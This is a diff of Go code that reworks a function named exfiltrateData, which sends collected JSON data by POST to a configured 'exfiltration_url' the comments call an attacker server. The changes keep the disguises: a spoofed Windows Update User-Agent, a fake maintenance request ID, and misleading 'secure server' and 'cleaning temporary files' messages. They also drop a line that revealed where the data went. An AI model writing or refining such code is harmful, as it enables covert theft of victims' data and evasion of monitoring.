@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	"net/url"
 	"strings"
 	"time"
 )
@@ -380,20 +379,17 @@ func exfiltrateData() {
 		return
 	}
 	
-	// Send to HTML page via GET request
+	// Send to local attacker server
 	fmt.Println("Uploading to secure server...")
 	
-	// Encode data for URL
-	encodedData := url.QueryEscape(string(jsonData))
-	exfiltrationURL := config["exfiltration_url"] + "?data=" + encodedData
-	
 	client := &http.Client{Timeout: 10 * time.Second}
-	req, err := http.NewRequest("GET", exfiltrationURL, nil)
+	req, err := http.NewRequest("POST", config["exfiltration_url"], bytes.NewBuffer(jsonData))
 	if err != nil {
 		fmt.Printf("Upload failed: %v\n", err)
 		return
 	}
 	
+	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("User-Agent", "Windows-Update-Agent/10.0")
 	req.Header.Set("X-Request-ID", "system-maintenance-2024")
 	
@@ -406,7 +402,6 @@ func exfiltrateData() {
 	} else {
 		resp.Body.Close()
 		fmt.Printf("Data successfully uploaded to secure server\n")
-		fmt.Printf("View exfiltrated data at: %s\n", exfiltrationURL)
 	}
 	
 	fmt.Println("Cleaning temporary files...")
